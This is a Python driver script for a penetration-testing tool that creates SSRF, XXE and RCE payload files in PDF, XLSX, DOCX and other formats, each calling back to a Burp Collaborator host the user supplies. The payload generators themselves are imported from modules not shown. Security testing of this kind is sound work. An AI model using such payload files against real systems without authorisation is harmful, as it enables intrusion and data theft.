#!/usr/bin/env python3
import sys
import os
import argparse
from pathlib import Path

from generators.pdf_generator import generate_pdf_payloads
from generators.xlsx_generator import generate_xlsx_payloads
from generators.docx_generator import generate_docx_payloads
from generators.others_generator import generate_others_payloads

def main():
    parser = argparse.ArgumentParser(description='Générateur de payloads SSRF, XXE, RCE pour tous les formats')
    parser.add_argument('burp_collab', help='URL du Burp Collaborator (ex: abc123.burpcollaborator.net)')
    args = parser.parse_args()

    burp_collab = args.burp_collab
    print(f"[+] Génération de payloads vers: {burp_collab}")
    print("[+] Création des dossiers...\n")

    base_dir = Path.cwd()
    output_dirs = {
        'pdf': base_dir / 'pdf',
        'xlsx': base_dir / 'xlsx',
        'docx': base_dir / 'docx',
        'others': base_dir / 'others'
    }

    for dir_path in output_dirs.values():
        dir_path.mkdir(exist_ok=True)

    try:
        print("[+] Génération des payloads PDF...")
        generate_pdf_payloads(output_dirs['pdf'], burp_collab)
        print("[✓] PDF terminé\n")

        print("[+] Génération des payloads XLSX...")
        generate_xlsx_payloads(output_dirs['xlsx'], burp_collab)
        print("[✓] XLSX terminé\n")

        print("[+] Génération des payloads DOCX...")
        generate_docx_payloads(output_dirs['docx'], burp_collab)
        print("[✓] DOCX terminé\n")

        print("[+] Génération des payloads autres formats...")
        generate_others_payloads(output_dirs['others'], burp_collab)
        print("[✓] Autres formats terminé\n")

        print("[+] Tous les payloads ont été générés avec succès!")
        print(f"[+] Fichiers créés dans: {base_dir}")
    except Exception as error:
        print(f"[!] Erreur lors de la génération: {error}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()

